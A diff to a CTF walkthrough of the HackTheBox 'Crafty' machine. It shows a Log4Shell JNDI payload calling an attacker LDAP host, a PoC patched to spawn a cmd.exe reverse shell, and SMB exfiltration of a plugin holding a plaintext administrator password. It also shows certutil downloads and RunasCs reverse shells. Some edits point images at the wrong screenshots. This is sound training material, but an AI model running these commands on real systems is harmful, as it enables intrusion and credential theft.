@@ -43,7 +43,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.230.193
 ```
 
-![ping](crafty_01_ping.png)
+![ping](screenshots/crafty_01_ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -54,9 +54,9 @@ Scan all TCP ports to identify open services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.230.193 -oG allPorts
 ```
 
-![nmap all ports (1)](crafty_02_nmap_allports.png)
+![nmap all ports (1)](screenshots/crafty_02_nmap_allports.png)
 
-![nmap all ports (2)](crafty_03_nmap_allports_2.png)
+![nmap all ports (2)](screenshots/crafty_03_nmap_allports_2.png)
 
 Extract the open ports:
 
@@ -64,7 +64,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](screenshots/crafty_04_extractports.png)
+![extractports](screenshots/crafty_03_nmap_allports_2.png)
 
 Open ports (this run):
 
@@ -80,9 +80,9 @@ nmap -sCV -p80,25565 10.129.230.193 -oN targeted
 cat targeted
 ```
 
-![nmap targeted (1)](crafty_05_nmap_targeted_1.png)
+![nmap targeted (1)](screenshots/crafty_05_nmap_targeted_1.png)
 
-![nmap targeted (2)](screenshots/crafty_06_nmap_targeted_2.png)
+![nmap targeted (2)](screenshots/crafty_05_nmap_targeted_1.png)
 
 **Findings:**
 
@@ -108,7 +108,7 @@ IIS responds on port 80 and redirects to a hostname, so fingerprinting should be
 whatweb http://10.129.230.193
 ```
 
-![whatweb crafty.htb chain](crafty_07_whatweb.png)
+![whatweb crafty.htb chain](screenshots/crafty_07_whatweb.png)
 
 **Observed (representative):**
 
@@ -124,11 +124,11 @@ The IIS site is thin, but it is still worth running a quick directory pass and m
 gobuster dir -u http://crafty.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
 ```
 
-![gobuster crafty.htb](crafty_08_gobuster.png)
+![gobuster crafty.htb](screenshots/crafty_08_gobuster.png)
 
 The public site mentions `play.crafty.htb`, but browsing it in a normal browser session redirected back to the main site in this run, so the interesting external surface remained the Minecraft listener on `25565`.
 
-![crafty website play.crafty.htb reference](screenshots/crafty_09_website_play_reference.png)
+![crafty website play.crafty.htb reference](screenshots/crafty_10_minecraft_client_offline.png)
 
 ---
 ### 2.3 Minecraft console client (offline login)
@@ -144,7 +144,7 @@ chmod +x minecraft_server
 
 Use an arbitrary username and leave the password empty so the client operates in offline mode and can attach to the server console/chat surface.
 
-![minecraft console client offline login](crafty_10_minecraft_client_offline.png)
+![minecraft console client offline login](screenshots/crafty_10_minecraft_client_offline.png)
 
 ---
 ## 3. Foothold
@@ -157,7 +157,7 @@ With an LDAP listener reachable from the victim, send a JNDI lookup string throu
 ${jndi:ldap://10.10.15.206/test}
 ```
 
-![log4j ldap callback listener](crafty_11_log4j_ldap_callback.png)
+![log4j ldap callback listener](screenshots/crafty_11_log4j_ldap_callback.png)
 
 If the listener shows activity, treat the Minecraft logging pipeline as a viable Log4Shell-style entry point and move to a full exploit chain.
 
@@ -171,9 +171,9 @@ git clone https://github.com/kozmer/log4j-shell-poc.git
 cd log4j-shell-poc
 ```
 
-![log4j poc jdk requirement / repo setup](crafty_12_log4j_poc_setup.png)
+![log4j poc jdk requirement / repo setup](screenshots/crafty_12_log4j_poc_setup.png)
 
-![jdk folder renamed for poc.py](crafty_13_jdk_layout.png)
+![jdk folder renamed for poc.py](screenshots/crafty_13_jdk_layout.png)
 
 Because the target is Windows, the exploit payload must spawn **`cmd.exe`**, not a Unix shell. In the Java exploit source, update the command string accordingly (this run changed a `String cmd="..."` assignment from a Unix shell to `cmd.exe`).
 
@@ -183,7 +183,7 @@ Because the target is Windows, the exploit payload must spawn **`cmd.exe`**, not
 # String cmd="cmd.exe";
 ```
 
-![poc patched for cmd.exe](crafty_14_poc_cmd_exe_patch.png)
+![poc patched for cmd.exe](screenshots/crafty_14_poc_cmd_exe_patch.png)
 
 Start the PoC with your attacker IP and listener ports, keep a `netcat` listener ready on the chosen callback port, then paste the JNDI string printed by the tool into Minecraft.
 
@@ -197,13 +197,13 @@ Example emitted payload (values vary by run):
 ${jndi:ldap://10.10.15.206:1389/a}
 ```
 
-![poc.py running with listener instructions](crafty_15_poc_python_running.png)
+![poc.py running with listener instructions](screenshots/crafty_15_poc_python_running.png)
 
-![netcat catches cmd.exe reverse shell](crafty_16_netcat_shell.png)
+![netcat catches cmd.exe reverse shell](screenshots/crafty_16_netcat_shell.png)
 
 You should land in a Windows command context from which you can read the user proof.
 
-![user shell and user flag context](crafty_17_user_shell.png)
+![user shell and user flag context](screenshots/crafty_17_user_shell.png)
 
 ðŸ **User flag obtained**
 
@@ -222,7 +222,7 @@ impacket-smbserver share . -smb2support
 copy <plugin-path-from-server>\PLUGIN.jar \\10.10.15.206\share\
 ```
 
-![impacket smbserver plugin exfil](crafty_18_smb_plugin_exfil.png)
+![impacket smbserver plugin exfil](screenshots/crafty_18_smb_plugin_exfil.png)
 
 ---
 ### 4.2 Decompiling the plugin to recover credentials
@@ -233,13 +233,13 @@ Open the recovered JAR locally and review compiled code/strings for hard-coded s
 jd-gui &> /dev/null & disown
 ```
 
-![jd-gui plugin overview](crafty_19_jdgui_plugin.png)
+![jd-gui plugin overview](screenshots/crafty_19_jdgui_plugin.png)
 
 The decompiled content suggested a localhost-oriented connection string material and exposed a password value (`s67u84zKq8IXw` in this run).
 
-![jd-gui recovered password material](crafty_20_jdgui_password.png)
+![jd-gui recovered password material](screenshots/crafty_20_jdgui_password.png)
 
-![jd-gui RCON password in Playercounter (detail)](crafty_20b_jdgui_password_detail.png)
+![jd-gui RCON password in Playercounter (detail)](screenshots/crafty_20b_jdgui_password_detail.png)
 
 **Recovered (this run):** `administrator` context password `s67u84zKq8IXw` (redact before publishing if needed).
 
@@ -252,7 +252,7 @@ Transfer `RunasCs` to the victim using `certutil` (this run pulled the v1.5 rele
 certutil.exe -f -urlcache -split http://10.10.15.206/RunasCs.exe RunasCs.exe
 ```
 
-![certutil downloads RunasCs](crafty_21_certutil_runascs.png)
+![certutil downloads RunasCs](screenshots/crafty_21_certutil_runascs.png)
 
 Validate the recovered password by executing a command as `administrator` with RunasCs (for example a `whoami` check), then spawn a reverse shell in that identity to work comfortably.
 
@@ -260,13 +260,13 @@ Validate the recovered password by executing a command as `administrator` with R
 .\RunasCs.exe administrator s67u84zKq8IXw cmd.exe /c whoami
 ```
 
-![runascs administrator whoami validation](crafty_22_runascs_whoami.png)
+![runascs administrator whoami validation](screenshots/crafty_22_runascs_whoami.png)
 
 ```cmd
 .\RunasCs.exe administrator s67u84zKq8IXw cmd.exe -r 10.10.15.206:443
 ```
 
-![runascs administrator reverse shell / root proof](crafty_23_runascs_reverse_root.png)
+![runascs administrator reverse shell / root proof](screenshots/crafty_23_runascs_reverse_root.png)
 
 ðŸ **Root flag obtained**
 
